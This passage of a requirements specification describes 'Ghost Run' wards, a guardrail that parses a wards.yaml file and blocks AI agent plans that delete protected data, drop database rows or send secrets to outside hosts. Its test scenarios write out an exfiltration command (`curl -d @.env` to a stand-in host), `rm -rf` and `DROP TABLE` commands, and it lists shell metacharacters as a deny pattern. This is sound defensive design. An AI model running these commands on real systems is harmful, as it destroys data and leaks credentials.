3. THE `parseWards` function SHALL validate the common fields of every Ward: `id` (required string matching `^[a-z0-9][a-z0-9-]{0,63}$`) and `kind` (required, one of `path`, `sql`, `egress`, `physics`); an unknown `kind` SHALL produce `unknown-kind` naming the allowed values.
4. THE `parseWards` function SHALL validate a `path` Ward: `deny` (required, non-empty, each of `delete` or `overwrite`, no duplicate), `paths` (required, 1 to 1,000 entries, each valid by `validateGlob`), and `case_sensitive` (optional boolean).
5. THE `parseWards` function SHALL validate a `sql` Ward: `tables` (required, 1 to 1,000 entries, each matching `^[A-Za-z_][A-Za-z0-9_]{0,127}$`) and `max_rows_lost` (required safe integer greater than or equal to `0`).
6. THE `parseWards` function SHALL validate an `egress` Ward: `secrets` (required, 1 to 1,000 entries, each valid by `validateGlob`) and `allow_hosts` (required, 0 to 1,000 entries, each valid by `validateHostEntry`; the empty list means no host is allowed).
7. THE `parseWards` function SHALL validate a `physics` Ward: `min_success_rate` (required finite number from `0` to `1` inclusive), `max_contact_force_n` (required finite number greater than or equal to `0`), and `forbidden_contacts` (required list of 0 to 1,000 non-empty strings).
8. THE `parseWards` function SHALL report `missing-field` for a required field that is absent, `unknown-field` for a field that the kind does not define, `wrong-type` for a value of the wrong YAML type (for example a number where a list is required, or a string `"0"` where an integer is required), `out-of-range` for a value outside its range (`min_success_rate: 1.5`, `max_rows_lost: -1`, `max_rows_lost: 1.5`), `duplicate-id` for a second Ward with an `id` already used (reported at the second occurrence and naming the line of the first), `invalid-glob` and `invalid-host` for list entries that `validateGlob` or `validateHostEntry` reject (carrying the underlying `code` as `detail`), and `duplicate-entry` for a repeated entry in one list after normalization.
9. THE `parseWards` function SHALL report `invalid-character` for an `id`, pattern, host entry, table name, or contact name that contains a control character (U+0000 to U+001F, U+007F) or one of the hidden characters U+200B to U+200D, U+2060, U+FEFF, U+202A to U+202E, U+2066 to U+2069, or U+E0000 to U+E007F; this is a configuration check and not the P7 detector.
10. THE `parseWards` function SHALL parse the document into a `WardSet` whose Ward order equals the document order, and SHALL leave an absent optional field absent (no default injected into the value).
11. THE `parseWards` function SHALL return the `WardSet` only when no Config_Error exists; with one or more errors it SHALL return no `wardSet`.
12. THE Node_Entry of Wards_Config (`@ghost-run/wards-config/node`) SHALL export `loadWardsFile(path: string)`, which reads the file as UTF-8 and calls `parseWards`, and SHALL return the error `file-unreadable` with the path (and no line) when the file cannot be read; the Default_Entry SHALL NOT export it (Requirement 1 criterion 10).
13. THE `parseWards` function SHALL validate the optional top-level key `safe_commands` as a sequence of 0 to 256 strings, each a Safe_Command_Entry, with these rules, checked per entry in this order:
    1. A value that is not a sequence (including an empty value, which YAML reads as null) SHALL give `wrong-type` at the line of the value; an item that is not a string SHALL give `wrong-type` at the line of the item.
    2. An entry that contains a control character or a hidden character of criterion 9 (this includes tab, carriage return, and line feed) SHALL give `invalid-character`.
    3. An entry whose length is 0 or more than 256 UTF-16 code units SHALL give `out-of-range`; a list of more than 256 entries SHALL give `out-of-range` once, at the line of the list value.
    4. An entry that does not match `^[A-Za-z0-9_./:=@%+,-]+( [A-Za-z0-9_./:=@%+,-]+)*$` SHALL give the new code `unsafe-command-entry`. The pattern means: one or more tokens separated by exactly one space, no leading or trailing space, and every token made only of ASCII letters, digits, and the characters `_ . / : = @ % + , -`. Every shell operator and metacharacter (`;`, `&`, `&&`, `|`, `||`, `>`, `<`, a backtick, `$`, `$(`, quotes, `\`, `(`, `)`, `{`, `}`, `*`, `?`, `[`, `]`, `!`, `#`, `~`) and every non-ASCII character is outside the charset and gives this code; so does a double space, a leading space, and a trailing space. The `detail` of the error is `charset` or `spacing`.
    5. An entry that equals an earlier entry of the same list (exact string equality; no normalization is needed because the grammar fixes the spacing) SHALL give `duplicate-entry` at the later entry, with a message that names the line of the first occurrence.
    The error `field` is `safe_commands` for the list and `safe_commands[<i>]` for entry `i`; the error message names the field and never contains the entry text. The result keeps document order and removes nothing. The total size of the list counts toward the input cap of Requirement 13 criterion 7. `safe_commands` is a known root field, so `unknown-root-field` does not apply to it, and a repeated `safe_commands` key gives `duplicate-key`.
14. THE `parseWards` function SHALL NOT interpret the meaning of a Safe_Command_Entry beyond criterion 13: matching a command against the list belongs to `ghost-gate`, and the Ward_Engine and `core` SHALL ignore `safeCommands` (the `WardSet` type of `core` is unchanged).

### Requirement 13: Error Reporting and Parser Safety

**User Story:** As a developer, I want every configuration error to name its line and the ward it belongs to, and I want the parser to be safe on hostile input.

#### Acceptance Criteria

1. THE Config_Error of every finding that has a source position SHALL carry `line` (1-based) and `column` (1-based), and SHALL carry `wardId` when the Ward's `id` is known and `field` when a field is involved (for example `paths[1]`).
2. THE `line` of an error SHALL be the line of the offending value for `wrong-type`, `out-of-range`, `invalid-glob`, `invalid-host`, `invalid-character`, and `duplicate-entry`; the line of the key for `unknown-field`; the line of the Ward's mapping start for `missing-field`, `unknown-kind`, and `duplicate-id`; and the line of the YAML syntax error for `yaml-syntax-error`; for `safe_commands`, the line of the offending item for `wrong-type` (item), `invalid-character`, `out-of-range` (entry length), `unsafe-command-entry`, and `duplicate-entry`, and the line of the list value for `wrong-type` (not a list) and `out-of-range` (too many entries).
3. THE Wards_Config package SHALL export `formatConfigError(error)` returning exactly `wards.yaml:<line>:<column>: [<code>] ward "<wardId>" field "<field>": <message>`, omitting the `ward` part when `wardId` is unknown and the `field` part when no field is involved, so that the same error always renders to the same string.
4. THE `parseWards` function SHALL report all errors found in one pass up to a limit of 50 errors, and SHALL add the final error `too-many-errors` when more exist.
5. THE `parseWards` function SHALL report a YAML syntax error as `yaml-syntax-error` with the line of the error and SHALL NOT throw an exception for any input string.
6. THE `parseWards` function SHALL reject anchors, aliases, merge keys, and custom tags with the error `yaml-feature-unsupported`, and SHALL report a repeated mapping key as `duplicate-key` naming the line of the first occurrence.
7. THE `parseWards` function SHALL reject an input larger than 262,144 bytes with the error `input-too-large` before parsing, and SHALL reject a nesting depth greater than 8 with `yaml-feature-unsupported`.
8. THE `parseWards` function SHALL complete for an input of 262,144 bytes within 1.0 s on the Reference_Machine.
9. THE `parseWards` function SHALL put no value of the input text into an error message other than the offending field name, the `id`, the error code, the line of a first occurrence, and (for `invalid-glob` and `invalid-host`) the offending entry truncated to 80 characters with control and hidden characters replaced as in Requirement 17 criterion 7.
10. THE license of the chosen YAML library and of every other new dependency of Wards_Config SHALL be checked on the day the dependency is added and recorded in the README table (Requirement 1 criterion 7); the library choice itself is a design-time decision.
11. FOR ALL generated invalid documents (one mutation each: unknown kind, missing field, extra field, wrong type, duplicate id, out-of-range value, invalid glob, invalid host, and, for `safe_commands`, non-list value, non-string item, hidden character, over-long entry, too many entries, an entry with a shell operator, and a duplicate entry), THE `parseWards` function SHALL return `ok: false` with an error of the expected `code` whose `line` is the line of the mutated node.

### Requirement 14: WardSet Printer and Round Trip

**User Story:** As a developer, I want to print a `WardSet` back to `wards.yaml` text, so that tools can write wards and the parser is verified by a round trip.

#### Acceptance Criteria

1. THE Default_Entry of Wards_Config SHALL export `printWards(wardSet: WardSet, options?: { safeCommands?: readonly string[] }): string` that returns a canonical YAML document: key order `id`, `kind`, then the kind-specific fields in the order of Requirement 12 criteria 4 to 7, two-space indentation, one list entry per flow item, strings quoted whenever plain style could change the parsed value (for example `".env"`, `"data/**"`, `"0"`), and a trailing newline. WHEN `options.safeCommands` is present and non-empty, the document SHALL end with one more top-level line after the last ward, `safe_commands: [<entry>, <entry>, ...]`, a flow sequence with entries separated by `, ` and quoted by the same string rule as other lists (so `ls` prints plain and `git status` prints as `"git status"`); WHEN it is absent or empty, the key SHALL be omitted.
2. FOR ALL valid `WardSet` values `ws` and all valid `safeCommands` lists `sc` (entries valid by Requirement 12 criterion 13), THE parse of `printWards(ws, { safeCommands: sc })` SHALL return `ok: true` with a `wardSet` deep-equal to `ws` and a `safeCommands` array equal to `sc` (round trip); an empty `sc` prints no key and parses back to `[]`.
3. FOR ALL such `ws` and `sc`, printing the parsed printed text (with the parsed `safeCommands`) SHALL produce a string identical to the first printed text (idempotence).
4. THE `printWards` function SHALL NOT preserve comments, and THE README SHALL state that comments are lost when a file is rewritten by `printWards`.
5. THE `printWards` function SHALL NOT write a file; writing is the caller's task. A caller that rewrites a file with `printWards` and omits `options.safeCommands` drops the `safe_commands` key; the README SHALL state this next to the comment-loss note.

### Requirement 15: Monotonicity (P4) for the Refined Rules

**User Story:** As a world author, I want tightening a ward to never turn a blocked plan into a passing plan, even with globs, host lists, the case flag, and content inspection.

#### Acceptance Criteria

1. THE `isMoreRestrictive(w1, w2)` predicate SHALL remain exported from `core` with the definition of core-contract Requirement 11, and every existing P4 test (`core/tests/p4-monotonicity.test.ts`) SHALL pass unchanged.
2. THE `isMoreRestrictive` predicate SHALL compare `paths`, `secrets`, `allow_hosts`, and `tables` as sets of strings after normalization (patterns by the Path_Normalizer, host entries by the Host_Matcher normalization, tables by lowercase), so that `./data/` and `data` are one entry.
3. THE `isMoreRestrictive` predicate SHALL be sound and incomplete: WHEN it returns `true`, no plan's verdict decreases (soundness); it MAY return `false` for a pair that is in fact tighter, for example `["data/**"]` versus `["data/**", "data/x"]` (the added pattern is redundant), `["*.example.test"]` versus `["a.example.test"]`, or a port entry versus a portless entry, because comparing sets by string containment does not reason about what a pattern matches. THE README and the tests SHALL state this limit.
4. THE `isMoreRestrictive` predicate SHALL treat `case_sensitive` as a tightening when it changes from `true` to absent or `false`, and as a loosening when it changes from absent or `false` to `true`; WHEN `case_sensitive` is absent in one Ward and `false` in the other, THE predicate SHALL treat them as equal.
5. THE property test for P4 SHALL check soundness only (a `true` result implies verdict(W2) >= verdict(W1) for every generated plan) and SHALL NOT check completeness.
6. THE Ward_Engine SHALL satisfy monotonicity for content inspection: FOR ALL pairs with `isMoreRestrictive(W1, W2) === true`, all generated Change and event lists, and all generated payload and `secretValues` contexts, the verdict under W2 SHALL be greater than or equal to the verdict under W1.
7. THE generators of the P4 test SHALL be extended to produce glob patterns, path spellings with bypass forms, host entries with and without ports and wildcards, `case_sensitive` values, payloads with encoded Canaries, and Canaries bound to secret paths; the test SHALL run at least 100 examples in a Short_Run and at least 10,000 in a Nightly_Run.
8. WHEN `isMoreRestrictive` compares two Wards of the same `id` but different `kind`, THE predicate SHALL report a loosening (existing behavior) and SHALL continue to return `false` for duplicate ids in either set.
9. THE core `VariantResult` type SHALL have the optional boolean fields `jointLimitExceeded` and `selfCollisionOccurred`; WHEN any variant of a `GhostReport` has `jointLimitExceeded === true`, THE Ward_Engine SHALL add to every `physics` Ward a violation with the reason `joint limit exceeded in variant <variantId>`, and WHEN any variant has `selfCollisionOccurred === true`, a violation with the reason `self-collision occurred in variant <variantId>`, in both cases regardless of the success rate and of every parameter of the Ward (`<variantId>` is sanitized by Requirement 17 criterion 7).
10. BECAUSE the hard failures of criterion 9 do not depend on any `physics` Ward parameter, tightening or loosening such a parameter SHALL NOT change whether they block, so `isMoreRestrictive` and the P4 property are unaffected by them.

### Requirement 16: Block Message Format

**User Story:** As an agent that was blocked, I want one deterministic message naming the ward, the numbers, a fixed fix suggestion, and a link to the detail page, so that I can retry with a safer plan.

#### Acceptance Criteria

1. THE Message_Builder SHALL render a `block` verdict as lines separated by `\n`, where line 1 is `GHOST RUN BLOCKED by ward <wardId>: <reason>. <suggestion>`, `<wardId>` and `<reason>` come from the primary violation, and `<suggestion>` is the fixed text of the primary violation's Ward kind from criterion 2.
2. THE Message_Builder SHALL use exactly these fixed suggestion texts, with no LLM call and no variable part:

| Ward kind | Suggestion text |
|---|---|
| `path` | `Limit the command to paths the ward does not protect, or back up the protected paths first.` |
| `sql` | `Try a soft delete or a migration with a backup.` |
| `egress` | `Do not send secret files or their contents to hosts outside allow_hosts; remove the network call or use an allowed host.` |
| `physics` | `Reduce speed or contact force, or change the plan, and rehearse again.` |

3. THE Message_Builder SHALL choose the primary violation as the first violation of the first Ward, where Wards are ordered by their position in the `WardSet`, and the violations of one Ward keep the order of the Ward_Engine (Requirement 5 criterion 4, Requirement 8, Requirement 11 criterion 7).
4. WHEN the verdict holds more than one violation, THE Message_Builder SHALL add, after line 1, at most 3 lines of the form `Also violated ward <wardId>: <reason>.` in the same order, one per further violation, and WHEN more further violations exist, SHALL add the line `+<k> more violations. See the seance page.`
5. THE Message_Builder SHALL append the text ` Seance: <url>` to the last line of the message, where `<url>` is the Seance_Link, so that a block with one violation and a seance id `42` reads exactly: `GHOST RUN BLOCKED by ward no-data-loss: would delete 1,206 rows from users. Try a soft delete or a migration with a backup. Seance: http://localhost:5317/seance/42`.
6. THE Seance_Link SHALL have the form `<base>/seance/<id>`, with `<base>` configurable and defaulting to `http://localhost:5317`, with one trailing `/` of `<base>` removed, and with `<id>` the identifier of the graveyard entry or run supplied by the caller (Open Item 11).
7. IF `<base>` is not an `http://` or `https://` URL, or `<id>` does not match `^[A-Za-z0-9_-]{1,64}$`, THEN THE Message_Builder SHALL omit the ` Seance: <url>` text and SHALL NOT throw an exception.
8. THE Message_Builder SHALL limit each `<reason>` to 200 characters by replacing the excess with `...` (three ASCII dots) and SHALL limit the whole message to 1,200 characters by dropping `Also violated` lines from the end first; the `Seance:` text SHALL always be kept when present.
9. THE Message_Builder SHALL be deterministic: FOR ALL equal inputs (verdict, base, id, claims), the output string SHALL be identical, and the output SHALL contain no timestamp, random value, or host-specific text.

### Requirement 17: Pass and Warn Messages, Claim Lowering, and Sanitization

**User Story:** As a user and as an agent, I want pass and warn messages in the same style, honest claim wording when the Docker box is unavailable, and messages that cannot be used to inject text into the agent.

#### Acceptance Criteria

1. THE Message_Builder SHALL render a `pass` verdict as the single line `GHOST RUN PASSED: all <n> wards cleared.` where `<n>` is the number of Wards in the `WardSet` (`1 ward` for `n = 1`, `0 wards` for `n = 0`), followed by ` Seance: <url>` when a Seance_Link is available.
2. THE Message_Builder SHALL render a `warn` verdict as line 1 `GHOST RUN NEEDS HUMAN APPROVAL: <k> notice(s) outside the copy or needing review. First: <reason>.`, where `<k>` is the number of notices and `<reason>` is the reason of the first notice in verdict order, followed by ` Seance: <url>` when available.
3. THE `WardVerdict` of a `warn` result SHALL keep notices in the order: `effect-outside` notices by `stepIndex`, then `observed-event` notices by (`stepIndex`, kind, destination or path), then the content-inspection and limit notices of Requirements 9 and 2, so that the first notice is reproducible.
4. THE Message_Builder SHALL accept an optional input `claims: { p5: boolean, p6: boolean, reason?: 'static-analysis' | 'unsupported-step' }` from the caller (derived from the ghost-runner `isolation` object); WHEN `claims` is not passed (worlds where P5 and P6 do not apply, for example Ghost Hand), THE Message_Builder SHALL add no claim line.
5. WHEN `claims` is passed and `claims.p5` or `claims.p6` is `false`, THE Message_Builder SHALL append one line to the message of any verdict: the line `P5 and P6 protections are NOT guaranteed for this run: no ghost rehearsal took place (static analysis only).` (the constant `CLAIM_LOWERED_LINE`) WHEN `claims.reason` is `static-analysis` or absent, or the fixed line `Some steps could not be rehearsed in the playground; P5 and P6 are not claimed for this run.` (the constant `CLAIM_LOWERED_UNSUPPORTED_STEP_LINE`) WHEN `claims.reason` is `unsupported-step`; THE README and the UI SHALL lower the claim in the same way (the UI rendering itself is outside this spec).
6. THE Message_Builder SHALL contain no Canary value, no encoded Canary form, and no Payload byte in any message, and the only input from which it reads content-hit information is the violation reason that already satisfies Requirement 11 criterion 4.
7. THE Message_Builder SHALL sanitize every interpolated value that can come from an untrusted source (paths, hosts, table names, event ids, ward ids from a file): each control character (U+0000 to U+001F, U+007F) and each hidden character listed in Requirement 12 criterion 9 SHALL be replaced by `\u{<HEX>}` in upper-case hexadecimal, and each value longer than 120 characters SHALL be truncated to 117 characters followed by `...`, so that a file name containing a line break cannot start a new line in the message.
8. THE Ward_Engine SHALL apply the sanitization of criterion 7 to every `reason` string it produces, so that `WardVerdict` values are safe to log and to render before they reach the Message_Builder.

### Requirement 18: Default wards.yaml for Ghost Shell

**User Story:** As a demo author and a new user, I want a default `wards.yaml` that makes the five scenarios of `docs/plan.md` behave as the plan promises, so that the default experience is tested and honest.

#### Acceptance Criteria

1. THE repository SHALL contain exactly one canonical default wards file for Ghost Shell, and a test SHALL load it with `loadWardsFile` (imported from `@ghost-run/wards-config/node`, or through a relative source alias of that module) and require `ok: true`; its location is a design-time decision (Open Item 12; candidates are `apps/ghost-shell/wards.yaml` and `worlds/<name>/wards.yaml`).
2. THE default file SHALL contain exactly these three Wards, in this order, with these values:

```yaml
wards:
  - id: protect-data
    kind: path
    deny: [delete, overwrite]
    paths: ["data/**", "db/*.sqlite", ".env"]
  - id: no-data-loss
    kind: sql
    tables: [users, orders]
    max_rows_lost: 0
  - id: no-secret-egress
    kind: egress
    secrets: [".env", "**/*.pem"]
    allow_hosts: [registry.npmjs.org]
```

3. THE default file SHALL contain no `physics` Ward (it belongs to Ghost Hand) and SHALL NOT list `github.com` in `allow_hosts`; this deviates from the example in `docs/plan.md` because the repository rules allow only reserved domains and `registry.npmjs.org` in committed examples (Open Item 8).
4. THE default file and every other committed wards file, fixture, and test SHALL use hostnames only from the reserved suffixes `.example`, `.test`, `.localhost`, and `.invalid`, the documentation range `192.0.2.0/24`, and `registry.npmjs.org` as the `allow_hosts` example.
5. WHEN the ghost report of scenario 1 (`sqlite3 app.db "DROP TABLE users;"`, with `app.db` in the repository root and a `users` table of 1,206 rows) is evaluated with the default file, THE Ward_Engine SHALL return `block` with the first violation of Ward `no-data-loss` and the reason `would delete 1,206 rows from users`; and a fixed plan of a backup copy (`cp app.db app.db.bak`) followed by a soft delete (`UPDATE users SET deleted_at = 1`) SHALL return `pass`.
6. WHEN the ghost report of scenario 2 (`rm -rf ./data ./build`) is evaluated, THE Ward_Engine SHALL return `block` by Ward `protect-data` with one violation for every deleted file under `data/`; and the fixed plan `rm -rf ./build` SHALL return `pass`.
7. WHEN the ghost report of scenario 3 (`curl -d @.env https://setup-check.example`) is evaluated, with a `secret-read` of `.env` and a `network-attempt` to `setup-check.example:443` at the same step, THE Ward_Engine SHALL return `block` by Ward `no-secret-egress`; and WHEN the context holds the payload of that attempt and a `secretValues` entry for `.env` with a Canary, the verdict SHALL also contain the content violation with the Encoding_Kind `raw`.
8. WHEN the ghost report of scenario 4 (`npm test`) is evaluated, with no change under a Protected_Path, no row loss, and no observed event, THE Ward_Engine SHALL return `pass`.
9. WHEN the ghost report of scenario 5 (`npm run clean`, where the `clean` script hides `rm -rf data`) is evaluated, THE Ward_Engine SHALL return `block` by Ward `protect-data`, because the verdict depends on the `file-deleted` Changes under `data/` and not on the command text.
10. THE tests of criteria 5 to 9 SHALL run on synthetic `GhostReport` values without Docker; the Docker-box run of the same scenarios is the task of ghost-runner Requirement 18, which SHALL load the default file.
11. THE Block_Message of each blocking scenario SHALL equal the string produced by Requirement 16 for that report, and a test SHALL check the exact string of scenario 1 against the example of Requirement 16 criterion 5.
12. THE fixture `.env` of every test and demo SHALL contain only Canary values such as `sk-CANARY-abc123`, and no real credential SHALL be committed.
13. THE default file SHALL carry, after the three Wards, the top-level key `safe_commands` with exactly these five entries in this order, written as a flow sequence as `printWards` prints it: `ls`, `pwd`, `cat`, `git status`, `git diff` (Open Item 16, resolved). The "exactly these three Wards" rule of criterion 2 is unchanged by it. The test of criterion 1 SHALL expect `safeCommands` equal to these five entries. How `ghost-gate` matches a command against the entries is owned by the kiro-integration spec.

### Requirement 19: Safety Property Tests (P4, P5, P6)

**User Story:** As a reviewer, I want P4, P5, and P6 verified by property-based tests with the generators named in the plan, so that the claims are backed by evidence and asserted only within scope.

#### Acceptance Criteria

1. THE test suite SHALL use `vitest` and `fast-check`, and SHALL run each property with at least 100 generated examples in a Short_Run (on save of files under `core/**` and the Wards_Config package), finishing within 60 s together with the P1 to P4 tests of `core`, and with at least 10,000 examples in a Nightly_Run.
2. THE P5 property SHALL hold: FOR ALL generated Protected_Path patterns and all generated plans over a deterministic in-memory fixture file-system world that delete or overwrite a path matching the pattern, THE Ward_Engine SHALL return `block`; the plans SHALL include the spellings `./data/../data/x`, `data//x`, `data/./x`, `DATA/x` (case-insensitive default), the glob forms `data/**`, `db/*.sqlite`, and `**/*.pem`, a `find`-style recursive delete, move-then-delete, and a script-hidden delete (the delete performed by a script run as one action).
3. THE P5 generators SHALL model symbolic links only through the paths the fixture world reports (a delete through a link is reported against the real path), and SHALL NOT claim that the Ward_Engine resolves links (Requirement 5 criterion 5).
4. THE P5 test SHALL be a Docker-free test of the judgment; the P5 test of the Docker box against real shell commands, including `find -delete`, belongs to ghost-runner Requirement 17 criterion 4, and the P5 claim SHALL be stated for runs where P1 holds and not for `static-analysis` mode.
5. THE P6 property SHALL hold: FOR ALL generated combinations of a `secret-read` event of a Secret_Path at step `i` and a `network-attempt` to a generated host outside `allow_hosts` at step `j`, THE Ward_Engine SHALL return `block` when `j >= i` and SHALL add no behavior violation when `j < i`.
6. THE P6 content property SHALL hold: FOR ALL generated Canaries (prefix `sk-CANARY-` plus random alphanumeric characters, at least 8 bytes in total), all encoding kinds of Requirement 10, all prefixes and suffixes of 0 to 64 random bytes, base64 offsets 0, 1, and 2, and line breaks inserted into base64 and hex text, THE Content_Inspector SHALL detect the Canary with the matching Encoding_Kind; and FOR ALL random payloads that contain no encoded form of any Canary, THE Content_Inspector SHALL report no hit.
7. THE P6 content test SHALL include a case where the Canary appears in a payload sent to a host in `allow_hosts`, and SHALL require `block` (Requirement 11 criterion 1).
8. THE leak property SHALL hold: FOR ALL generated Canaries and Payloads, the JSON serialization of the `WardVerdict` and the output of the Message_Builder SHALL contain neither the Canary bytes nor any encoded form of the Canary (raw, base64, base64url, hex, percent) as a substring; the same SHALL hold for thrown error messages when `secretValues` is malformed or absent.
9. THE test code SHALL build hidden Unicode characters only from escape sequences (for example `"\u200B"`), and SHALL contain no such character literally.
10. THE P5 and P6 tests SHALL be reported as claimed only for the scopes of the Introduction table; WHEN the isolation mode is `static-analysis`, the tests of the Message_Builder SHALL require the lowered-claim line of Requirement 17 criterion 5.
11. THE Ward_Engine SHALL evaluate a report with 10,000 Changes, 100 observed events, 16 Payloads of 64 KiB, and 256 Canaries within 3.0 s on the Reference_Machine, so that the Pre Tool Use hook stays far below its 60 s limit.

## Open Items and Assumptions

These inconsistencies were found between the existing specs and code. This spec does not resolve them silently; each item states the hand-off chosen here.

1. **File Change kinds. Resolved.** Decision: the Ward_Engine accepts only the `core/src/types.ts` kinds `file-created`, `file-overwritten`, `file-deleted`, and `symlink-changed` (added to `core` by the ghost-runner implementation). `symlink-changed` counts as `overwrite` for `path` Wards (Requirement 5 criterion 2). `file-mode-changed` no longer exists: a mode-only change emits no Change and ghost-runner reports it as a Diagnostic. No alias such as `file-modified` is accepted.
2. **SQLite Change kinds. Resolved.** Decision: the Ward_Engine accepts only `sql-row-count` (`table`, `rowsBefore`, `rowsAfter`) with the optional `dropped` field (true when the table no longer exists; added to `core` by ghost-runner). A `sql` Ward has no per-file scope. Separately, `DROP TABLE users` on a file that matches a `path` Ward (such as `db/app.sqlite`) yields both a `file-overwritten` violation and a row-loss violation; this is intended.
3. **Event ids. Resolved.** Decision: `core` `ObservedEvent` has an optional `eventId` (added by ghost-runner). Ghost-runner assigns it and links `RunOutput.payloads` through it; the runner owns the id format, so the wards design defines none. Wards references the field as existing (Requirement 9 criterion 8).
4. **Observed events always warn.** The existing engine adds a warn notice for every observed event, independent of wards. An attempt to an allowed host after a secret read is therefore `warn`, never `pass`. This spec keeps that behavior (human approval for any observed network attempt or secret read); `npm test` passes only because it produces no event.
5. **Canary source. Resolved.** Decision: before executing the action, ghost-runner reads from the Copy into memory only the files matching the `secrets` patterns of the `egress` Wards and hands them to the Ward_Engine with the report as `secretValues`; nothing is persisted (ghost-runner Requirement 9 criteria 9 to 13). Wards uses `secretValues` as the only Canary source for P6 content inspection; there is no separately configured Canary list. When `secretValues` is absent or empty, content inspection does not run, the Behavior_Criterion still applies (Requirement 9 criterion 3), and no `secretValues` byte appears in any output (Requirement 9 criterion 9, Requirement 11 criterion 5).
6. **Notice kinds.** `WardNotice.kind` is `'effect-outside' | 'observed-event'`. New notices (path escapes the Copy root, content inspection did not run, canary discarded) need either new kinds or reuse; the design decides. `WardViolation` carries only a `reason` string, so structured numbers are not available to the Message_Builder; this spec relies on the reason format of Requirements 5, 6, 8, and 11.
7. **Property run sizes.** Core-contract requires at least 100 examples per Short_Run; ghost-runner requires 20 per Short_Run for Docker-bound properties. The wards properties are pure and Docker-free, so they follow the 100-example rule.
8. **Plan example versus repository rules.** `docs/plan.md` lists `github.com` in `allow_hosts`. The default file omits it (Requirement 18 criterion 3).
9. **Header note in `wards.ts`.** The file states that detailed rules "will be refined in the later wards spec". This spec is that refinement; the header note is removed when the implementation lands.
10. **Isolation input.** `GhostReport` has no field for the isolation mode, so the Ward_Engine cannot know about Plan B. Hand-off: the caller passes `claims` to the Message_Builder (Requirement 17 criterion 4); the design decides whether the claims travel with the report.
11. **Seance id.** No spec defines the graveyard or run identifier. This spec accepts any identifier matching `^[A-Za-z0-9_-]{1,64}$` from the caller; the `ui-kit` and `kiro-integration` specs must define its source.
12. **Default file location.** `world-contract` places `wards.yaml` under `worlds/<name>/`, but Ghost Shell is an app that uses the ghost-runner world. The location is left to the design (Requirement 18 criterion 1).
13. **Package directory.** `.kiro/steering/structure.md` does not list Wards_Config (or ghost-runner). The directory is a design-time decision, and the steering file is updated with it (Requirement 1 criterion 9).
14. **Out-of-order secrets.** Wards judge `secret-read` and `network-attempt` by `stepIndex` only. Two events inside one step cannot be ordered, so a network attempt that precedes the secret read inside one action is still blocked (conservative, Requirement 8 criterion 3).
15. **Core type extensions (assumption).** `symlink-changed`, `dropped`, `eventId`, and the `secretValues` hand-off type are implemented in `core` first by the ghost-runner implementation (ghost-runner Requirement 1 criteria 6 and 7). The wards implementation starts after that work, treats the types as present, and only references them. The exact field layout of a `secretValues` entry is owned by that core change; this spec requires only that each entry carries `secretPath` and the content bytes.
16. **Default `safe_commands` list. Resolved.** The default list for `apps/ghost-shell/wards.yaml` is `ls`, `pwd`, `cat`, `git status`, `git diff` (Requirement 18 criterion 13). The matching rules for entries (including the prefix-matching rule and the built-in safe list that the key extends) are owned by the kiro-integration spec; this spec covers only the list, parsing, printing, and errors.
17. **Browser-safe entry. Resolved.** The Ghost Shell playground (ghost-shell spec) parses `wards.yaml` in the browser, so the Default_Entry of Wards_Config imports no Node built-in and `loadWardsFile` moves to the subpath `@ghost-run/wards-config/node` (Requirement 1 criteria 10 and 11, Requirement 12 criterion 12). The `yaml` library 2.9.1 (ISC) has a browser build as the `default` condition of its `exports` map; this was confirmed on npm and in the installed package on 2026-11-18.

## Out of Scope

- Kiro Crew integration.
- Docker box mechanics, the Recorder, the Differ, and payload capture (ghost-runner spec).
- UI rendering of the candle, the seance page, and the graveyard (ui-kit spec).
- Hidden-Unicode detection (P7) and red-thread tracing (possession spec); Requirement 12 criterion 9 only rejects such characters inside `wards.yaml` values.
- Physics ward matching beyond the existing behavior of `checkPhysics` plus the two hard failures of Requirement 15 criterion 9.
- Symbolic-link resolution and move tracking inside the Ward_Engine (the world reports resolved paths).
- Content detection of compression, encryption, multi-layer encoding, and DNS exfiltration one character at a time.
- CIDR ranges and port ranges in `allow_hosts`.
- Hook scripts, MCP tools, and the Kiro power.
- Choice of the YAML library (design time; only its license rule is required here).
- Matching a command against `safe_commands` and the built-in safe list (kiro-integration spec, `ghost-gate`); this spec only parses, validates, and prints the list.
